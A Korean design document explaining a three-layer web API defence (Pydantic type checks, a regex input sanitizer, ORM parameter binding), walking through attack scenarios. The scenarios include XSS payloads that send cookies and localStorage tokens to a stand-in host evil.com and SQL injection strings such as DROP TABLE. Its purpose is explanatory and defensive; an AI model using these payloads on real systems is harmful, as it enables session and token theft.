# 🛡️ 다층 방어 시스템 상세 설명

## 개요

우리 시스템은 **3개의 독립적인 보안 계층**으로 구성되어 있으며, 각 계층은 서로 다른 유형의 공격을 방어합니다.

```
사용자 입력 (악의적일 수 있음)
        ↓
┌──────────────────────────────────────┐
│  1️⃣ Pydantic (라우터 레벨)           │ ← 타입 안전성
│  - 타입 검증                          │
│  - 필수 필드 확인                     │
│  - 데이터 형식 검증                   │
└──────────────────────────────────────┘
        ↓ (타입이 올바른 데이터만 통과)
┌──────────────────────────────────────┐
│  2️⃣ Sanitizer (서비스 레벨)          │ ← 콘텐츠 안전성 ⭐
│  - XSS/Script 제거                    │
│  - HTML 이스케이핑                    │
│  - 위험 패턴 탐지                     │
└──────────────────────────────────────┘
        ↓ (안전한 텍스트만 통과)
┌──────────────────────────────────────┐
│  3️⃣ ORM (데이터베이스 레벨)          │ ← SQL 안전성
│  - SQL Injection 자동 방어            │
│  - Prepared Statements                │
│  - 파라미터 바인딩                    │
└──────────────────────────────────────┘
        ↓
안전한 데이터베이스 저장
```

---

## 계층별 상세 설명

### 1️⃣ Pydantic - 타입 가드 (Type Guard)

**역할**: "이 데이터가 우리가 기대하는 형태인가?"

**위치**: `routers/` 디렉토리

**검증 항목**:
- ✅ 데이터 타입 (문자열, 숫자, 불린 등)
- ✅ 필수 필드 존재 여부
- ✅ 특수 형식 (UUID, 이메일, 날짜 등)
- ✅ 숫자 범위 (ge=1, le=5 등)

**예시**:
```python
# routers/chat/send_message.py
class MessageRequest(BaseModel):
    session_id: str              # 반드시 문자열
    message: str                 # 반드시 문자열
    user_id: Optional[int] = None  # 숫자 또는 None

# 잘못된 요청
{
  "session_id": 123,        # ❌ 숫자는 안 됨!
  "message": ["hello"]      # ❌ 배열은 안 됨!
}

# Pydantic 응답
{
  "detail": [
    {
      "loc": ["body", "session_id"],
      "msg": "str type expected",
      "type": "type_error.str"
    }
  ]
}
```

**왜 중요한가?**
- 🚀 **조기 차단**: 잘못된 데이터가 서비스 로직에 도달하기 전에 차단
- 💡 **명확한 피드백**: 클라이언트에게 정확히 무엇이 잘못되었는지 알려줌
- 🛡️ **타입 안전성**: 런타임 에러를 컴파일 타임에 방지

---

### 2️⃣ Input Sanitizer - 콘텐츠 검열관 (Content Inspector) ⭐

**역할**: "이 텍스트가 악의적인 코드를 포함하고 있는가?"

**위치**: `services/` 디렉토리 (모든 메서드의 첫 줄)

**처리 과정**:

```python
입력: "안녕하세요 <script>alert('XSS')</script>"

┌─────────────────────────────────────┐
│ 1단계: 위험 패턴 탐지                │
├─────────────────────────────────────┤
│ • <script.*?</script> 발견!         │
│ • 정규식 15개 패턴 중 1개 매칭       │
└─────────────────────────────────────┘
        ↓
┌─────────────────────────────────────┐
│ 2단계: 위험 부분 제거                │
├─────────────────────────────────────┤
│ • re.sub(pattern, '', text)         │
│ • "안녕하세요 " 으로 변환            │
└─────────────────────────────────────┘
        ↓
┌─────────────────────────────────────┐
│ 3단계: HTML 이스케이핑               │
├─────────────────────────────────────┤
│ • < → &lt;                          │
│ • > → &gt;                          │
│ • & → &amp;                         │
└─────────────────────────────────────┘
        ↓
출력: "안녕하세요 "
```

**탐지 가능한 공격 패턴**:

| 공격 유형 | 예시 | 처리 |
|----------|------|------|
| **XSS (Script 태그)** | `<script>alert(1)</script>` | 제거 |
| **XSS (Event Handler)** | `<img onerror=alert(1)>` | 제거 |
| **Protocol Injection** | `javascript:void(0)` | `javascript:` 제거 |
| **iframe Injection** | `<iframe src="evil.com">` | 제거 |
| **HTML Injection** | `<div>text</div>` | 이스케이핑 |
| **SQL Injection** | `' OR '1'='1` | 경고 (ORM이 방어) |

**실제 코드**:
```python
# services/chat_service.py
async def stream_message(self, message_text: str):
    # 🛡️ 보안: 입력 살균 (최우선 처리)
    message_text = sanitize_message(message_text)
    
    if not message_text:
        raise ValueError("Message cannot be empty after sanitization")
    
    # 이제 안전한 message_text로 작업
    # ...
```

**왜 서비스 레이어에서?**
- ✅ **최우선 실행**: 비즈니스 로직 전에 실행
- ✅ **중앙 집중화**: 모든 입력이 한 곳을 거침
- ✅ **일관성 보장**: 같은 살균 로직을 모든 곳에 적용

---

### 3️⃣ ORM - SQL 방화벽 (SQL Firewall)

**역할**: "이 쿼리가 안전하게 실행될 수 있는가?"

**위치**: SQLAlchemy, Supabase 클라이언트

**작동 원리**:

#### ❌ 위험한 방법 (사용하지 않음)
```python
# String concatenation - SQL Injection 취약!
user_input = "admin' OR '1'='1"
query = f"SELECT * FROM users WHERE name = '{user_input}'"
# 실제 SQL: SELECT * FROM users WHERE name = 'admin' OR '1'='1'
# → 모든 사용자 반환됨! 😱
```

#### ✅ 안전한 방법 (ORM이 자동 처리)
```python
# ORM을 사용한 쿼리
user_input = "admin' OR '1'='1"
user = session.query(User).filter(User.name == user_input).first()

# ORM이 생성하는 SQL:
# SELECT * FROM users WHERE name = ?
# Parameters: ["admin' OR '1'='1"]
#
# → 단순 문자열로 처리되어 SQL 실행 안 됨! ✅
```

**Prepared Statement 예시**:
```sql
-- 일반 SQL (위험)
SELECT * FROM chat_messages WHERE content = 'DROP TABLE users; --'

-- Prepared Statement (안전)
PREPARE stmt FROM 'SELECT * FROM chat_messages WHERE content = ?';
SET @content = 'DROP TABLE users; --';
EXECUTE stmt USING @content;
-- → "DROP TABLE users; --"는 그냥 문자열 데이터로 검색됨
```

**왜 자동으로 안전한가?**
1. **파라미터와 쿼리 분리**: SQL 구조와 데이터를 별도로 전송
2. **타입 검증**: 데이터베이스가 데이터 타입 확인
3. **이스케이핑**: 특수문자를 자동으로 이스케이프

---

## 🔄 실제 공격 시나리오

### 시나리오 1: XSS 공격 시도

```
👤 공격자:
POST /chat/message
{
  "session_id": "abc-123",
  "message": "안녕하세요 <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
  </script>"
}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ 계층 1: Pydantic
✅ session_id: str (통과)
✅ message: str (통과)
→ 서비스로 전달

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ 계층 2: Input Sanitizer
입력: "안녕하세요 <script>...</script>"

[Sanitizer] ⚠️ Dangerous pattern detected: <script[^>]*>.*?</script>

출력: "안녕하세요 "

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ 계층 3: ORM
INSERT INTO chat_messages (content) VALUES (?)
Parameters: ["안녕하세요 "]

✅ 안전하게 저장됨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

결과: XSS 공격 차단! 🎉
```

### 시나리오 2: SQL Injection 시도

```
👤 공격자:
POST /chat/message
{
  "session_id": "abc'; DROP TABLE chat_messages; --",
  "message": "테스트"
}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ 계층 1: Pydantic
✅ session_id: str (통과) 
✅ message: str (통과)
→ 서비스로 전달

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ 계층 2: Input Sanitizer
session_id: "abc'; DROP TABLE chat_messages; --"

[Sanitizer] ⚠️ Possible SQL injection pattern detected: DROP

→ 경고만 출력, 문자열 그대로 유지

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ 계층 3: ORM (여기서 차단!)
SELECT * FROM chat_sessions WHERE sid = ?
Parameters: ["abc'; DROP TABLE chat_messages; --"]

데이터베이스가 보는 것:
- sid 컬럼과 "abc'; DROP TABLE chat_messages; --" 문자열을 비교
- DROP TABLE 명령은 실행되지 않음!
- 단순히 sid가 "abc'; DROP TABLE chat_messages; --"인 세션을 찾음

✅ SQL Injection 무력화됨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

결과: SQL Injection 차단! 🎉
```

### 시나리오 3: 복합 공격 시도

```
👤 공격자:
POST /profiles
{
  "profile_name": "<img src=x onerror='fetch(\"evil.com?data=\" + localStorage.getItem(\"token\"))'>",
  "student_id": "20210001' OR '1'='1"
}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ 계층 1: Pydantic
✅ profile_name: str (통과)
✅ student_id: str (통과)
→ 서비스로 전달

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ 계층 2: Input Sanitizer (ProfileService)

profile_name 살균:
  입력: "<img src=x onerror='...'>"
  
  [Sanitizer] ⚠️ Dangerous pattern detected: on\w+\s*=
  
  → HTML 이스케이핑 적용
  출력: "&lt;img src=x onerror='...'&gt;"

student_id 살균:
  입력: "20210001' OR '1'='1"
  
  [Sanitizer] ⚠️ Possible SQL injection pattern detected: OR.*=
  
  출력: "20210001' OR '1'='1" (문자열 그대로)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ 계층 3: ORM

INSERT INTO profiles (profile_name, student_id) VALUES (?, ?)
Parameters: [
  "&lt;img src=x onerror='...'&gt;",
  "20210001' OR '1'='1"
]

✅ 두 값 모두 안전한 문자열로 저장됨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

결과: 복합 공격 모두 차단! 🎉
```

---

## 📊 각 계층의 역할 비교

| 항목 | Pydantic | Sanitizer | ORM |
|------|----------|-----------|-----|
| **검증 시점** | 요청 받자마자 | 서비스 진입 시 | DB 쿼리 시 |
| **실행 위치** | 라우터 레벨 | 서비스 레벨 | 데이터 레이어 |
| **주요 역할** | 타입/형식 검증 | 콘텐츠 살균 | SQL 방어 |
| **방어 대상** | 타입 에러 | XSS, Script | SQL Injection |
| **차단 방법** | 422 에러 반환 | 위험 코드 제거 | 파라미터 바인딩 |
| **개발자 제어** | 높음 (명시적) | 높음 (명시적) | 낮음 (자동) |
| **성능 영향** | 낮음 | 중간 | 낮음 |

---

## 💡 왜 3개 계층이 필요한가?

### "한 계층만으로는 부족한가요?"

**각 계층은 서로 다른 위협을 방어합니다:**

```
┌─────────────────────────────────────────┐
│ Pydantic만 사용한다면?                  │
├─────────────────────────────────────────┤
│ ✅ 타입 에러는 막을 수 있음              │
│ ❌ XSS는 못 막음 (문자열은 통과)         │
│ ❌ SQL Injection도 못 막음               │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│ Sanitizer만 사용한다면?                 │
├─────────────────────────────────────────┤
│ ❌ 타입 에러를 늦게 발견 (서비스 레벨)   │
│ ✅ XSS는 막을 수 있음                    │
│ ⚠️ SQL Injection은 ORM 의존              │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│ ORM만 사용한다면?                       │
├─────────────────────────────────────────┤
│ ❌ 타입 에러를 못 막음                   │
│ ❌ XSS를 못 막음                         │
│ ✅ SQL Injection은 막을 수 있음          │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│ 3개 계층 모두 사용한다면? ✅             │
├─────────────────────────────────────────┤
│ ✅ 타입 에러: Pydantic                   │
│ ✅ XSS: Sanitizer                        │
│ ✅ SQL Injection: ORM                    │
│ → 깊이 있는 방어 (Defense in Depth)     │
└─────────────────────────────────────────┘
```

---

## 🎯 핵심 원칙

### **Defense in Depth (심층 방어)**

> 하나의 방어선이 뚫려도, 다음 방어선이 막아낸다.

- 계층 1이 실패해도 → 계층 2가 막음
- 계층 2가 실패해도 → 계층 3이 막음
- **3개 모두 실패**해야만 공격 성공 (거의 불가능)

### **Fail-Safe (안전 우선)**

> 의심스러우면 차단한다.

```python
# Input Sanitizer의 철학
if 위험_패턴_발견:
    제거()  # 허용하지 않고 제거
    
if 빈_문자열:
    raise ValueError()  # 통과시키지 않음
```

---

## 📝 요약

```
┌─────────────────────────────────────────┐
│         3계층 방어 시스템                │
├─────────────────────────────────────────┤
│                                         │
│  1. Pydantic (타입 가드)                │
│     "올바른 형태인가?"                  │
│                                         │
│  2. Sanitizer (콘텐츠 검열관) ⭐         │
│     "악의적인 코드가 있는가?"           │
│                                         │
│  3. ORM (SQL 방화벽)                    │
│     "쿼리가 안전한가?"                  │
│                                         │
└─────────────────────────────────────────┘
         ↓
    안전한 시스템 🛡️
```

**각 계층은 독립적으로 작동하며, 함께 작동할 때 최강의 보안을 제공합니다!**
